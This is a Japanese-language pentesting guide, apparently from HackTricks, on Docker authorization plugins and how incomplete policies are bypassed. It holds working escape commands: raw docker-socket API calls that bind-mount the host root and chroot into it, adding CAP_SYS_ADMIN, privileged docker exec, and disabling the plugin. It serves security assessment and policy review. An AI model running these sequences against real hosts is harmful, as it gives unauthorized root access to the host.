# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Runtime authorization plugins は、呼び出し元が特定の daemon アクションを実行できるかどうかを判断する追加のポリシーレイヤーです。典型的な例は Docker です。デフォルトでは、Docker daemon と通信できるユーザーは、実質的に daemon を広範囲に制御できます。Authorization plugins は、認証済みユーザーと要求された API 操作を調べ、ポリシーに従ってリクエストを許可または拒否することで、そのモデルを制限しようとします。

このトピックを独立したページで扱うのは、攻撃者がすでに Docker API にアクセスできる場合や、`docker` グループのユーザー権限を持っている場合に、悪用のモデルが変わるためです。このような環境では、「daemon に到達できるか」だけでなく、「daemon は authorization layer によって制限されているか。また制限されているなら、未処理の endpoint、脆弱な JSON parsing、plugin 管理権限を通じてそのレイヤーを回避できるか」が問題になります。

## 動作

リクエストが Docker daemon に届くと、authorization subsystem はリクエストのコンテキストを、インストールされている1つ以上の plugin に渡します。plugin は、認証済みユーザーの identity、リクエストの詳細、選択された header、および content type が適切な場合はリクエストまたはレスポンス本文の一部を参照できます。複数の plugin を連鎖させることができ、すべての plugin がリクエストを許可した場合にのみアクセスが許可されます。

このモデルは強固に見えますが、安全性はポリシーの作成者が API をどれだけ完全に理解しているかに全面的に依存します。`docker run --privileged` をブロックしても `docker exec` を無視したり、トップレベルの `Binds` のような代替 JSON key を見落としたり、plugin の管理を許可したりする plugin は、制限されているという誤った安心感を与えながら、直接的な権限昇格の経路を残す可能性があります。

## よくある Plugin の調査対象

ポリシーを確認するうえで重要な領域は次のとおりです。

- container 作成 endpoint
- `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode`、namespace 共有オプションなどの `HostConfig` field
- `docker exec` の動作
- plugin 管理 endpoint
- 想定されるポリシーモデルの範囲外で runtime アクションを間接的に引き起こせる endpoint

歴史的には、Twistlock の `authz` plugin や、`authobot` のような学習用の単純な plugin が、このモデルの調査を容易にしました。ポリシーファイルやコードパスから、endpoint とアクションの対応付けが実際にどのように実装されているかが分かったためです。評価作業における重要な教訓は、ポリシーの作成者が、最も目立つ CLI コマンドだけでなく、API の全体像を理解する必要があるということです。

## 悪用

最初の目的は、実際に何がブロックされるかを把握することです。daemon がアクションを拒否すると、エラーに plugin 名が漏れることがあり、使用されている制御の特定に役立ちます：

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

より広範な endpoint profiling が必要な場合は、`docker_auth_profiler` などのツールが役立ちます。プラグインで実際に許可されている API route と JSON structure を確認するという、繰り返しの多い作業を自動化できます。

環境でカスタムプラグインが使われており、API を操作できる場合は、実際にフィルタリングされている object field を列挙してください。

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

これらのチェックが重要なのは、多くの認可失敗が概念全般ではなく、特定のフィールドに関するものだからです。プラグインはCLIのパターンを拒否しても、同等のAPI構造を完全にはブロックしない場合があります。

### 完全な例: `docker exec` によりコンテナ作成後に権限が追加される

特権コンテナの作成をブロックする一方で、制限のないコンテナの作成と `docker exec` を許可するポリシーは、依然としてバイパスされる可能性があります。

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

daemonが2つ目のステップを受け入れると、ユーザーは、ポリシー作成者が制限されていると考えていたコンテナ内で、特権を持つ対話型プロセスを取り戻したことになります。

呼び出し元がDocker socketに直接アクセスできない場合でも、制限付きの`sudo`ルールによって同じ経路が開かれることがあります。たとえば、root権限で実行される`/usr/bin/docker exec *`の許可があれば、呼び出し元がDockerの`--privileged`および`--user root`オプションを指定できる場合があります。ただし、実行中のコンテナが必要です。Linuxホストによっては、`docker ps`が拒否されても、`containerd-shim`プロセスのコマンドラインからコンテナIDを確認できます。このルールは調査の手掛かりとして扱ってください。実際に適用されるsudoポリシー、daemonの認可制御、user namespace、そして起動したプロセスがホストデバイスや書き込み可能なホストマウントにアクセスできるかを確認します。Dockerの[execオプションに関するドキュメント](https://docs.docker.com/reference/cli/docker/container/exec/)を参照してください。

呼び出し元が選んだComposeファイルを受け取るroot実行のラッパーでは、`privileged: true`を拒否し、bind mountに`:ro`を必須とするだけでなく、[Composeのサービスモデル](https://docs.docker.com/reference/compose-file/services/)全体を検証する必要があります。`cap_add`、`security_opt`、devices、namespaces、build inputs、およびサポートされるすべてのvolume構文を確認してください。読み取り専用のbind mountでも、daemonやkernelのポリシーによっては、適切なcapabilitiesと緩和されたsecurity confinementを持つコンテナ内から書き込み可能になることがあります。ホストパスのprefixだけを使ったallowlistや、最終パス要素に対するsymlinkチェックも要確認です。sudoルールと文字どおりの`docker-compose up`呼び出しは調査対象を特定する材料にはなりますが、悪用可能かどうかを決めるのは、ラッパーの実効的な検証と実行時のdaemon制限です。

### 全文例：Raw API経由のBind Mount

不適切なポリシーの中には、1つのJSON形式しか検査しないものがあります。root filesystemのbind mountが一貫してブロックされていなければ、ホストをマウントできてしまいます。

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

同じ考え方は `HostConfig` の下にも見られる場合があります：

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

影響はホストのファイルシステムへの完全な脱出です。興味深い点は、この bypass が kernel bug ではなく、ポリシーの適用範囲が不完全なことに起因する点です。

### 完全な例: 未チェックの Capability 属性

ポリシーで capability 関連の属性のフィルタリングを忘れると、攻撃者は危険な capability を再取得するコンテナを作成できる可能性があります:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

`CAP_SYS_ADMIN` または同等に強力な capability があると、[capabilities.md](protections/capabilities.md) や [privileged-containers.md](privileged-containers.md) で説明されている多くの breakout 手法が利用可能になります。

### 完全な例: Plugin を無効化する

plugin の管理操作が許可されている場合、最も確実な bypass は制御機能を完全にオフにすることです:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

これは control-plane レベルでのポリシー不備です。authorization layer は存在しますが、制限対象であるはずのユーザーに、それを無効化する権限が残っています。

## 確認

これらのコマンドは、ポリシー層が存在するか、またそれが完全なものか、あるいは表面的なものにすぎないかを特定するためのものです。

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

ここで興味深い点は次のとおりです。

- plugin 名を含む拒否メッセージは、authorization layer の存在を裏付け、多くの場合、正確な実装を明らかにします。
- 攻撃者から見える plugin list だけで、disable または reconfigure 操作が可能かどうかを特定できる場合があります。
- 明白な CLI 操作だけをブロックし、raw API requests をブロックしないポリシーは、バイパスできないことが証明されるまでは、バイパス可能なものとして扱うべきです。

## Runtime のデフォルト設定

| Runtime / platform | デフォルトの状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効になっていない | authorization plugin が設定されていない限り、daemon へのアクセスは実質的にすべて許可するか、すべて拒否するかのどちらかです | 不完全な plugin policy、allowlist ではなく blacklist を使用、plugin management を許可、フィールド単位の見落とし |
| Podman | 一般的な直接の同等機能はありません | Podman は通常、Docker-style authz plugins よりも Unix permissions、rootless execution、API exposure の判断に依存します | rootful Podman API を広範囲に公開、socket permissions が弱い |
| containerd / CRI-O | 制御モデルが異なります | これらの runtime は通常、Docker authz plugins ではなく、socket permissions、node trust boundaries、上位レイヤーの orchestrator controls に依存します | socket を workloads に mount、node-local trust assumptions が弱い |
| Kubernetes | Docker authz plugins ではなく、API-server と kubelet のレイヤーで authn/authz を使用します | Cluster RBAC と admission controls が主な policy layer です | 範囲の広すぎる RBAC、弱い admission policy、kubelet または runtime APIs の直接公開 |

{{#include ../../../banners/hacktricks-training.md}}
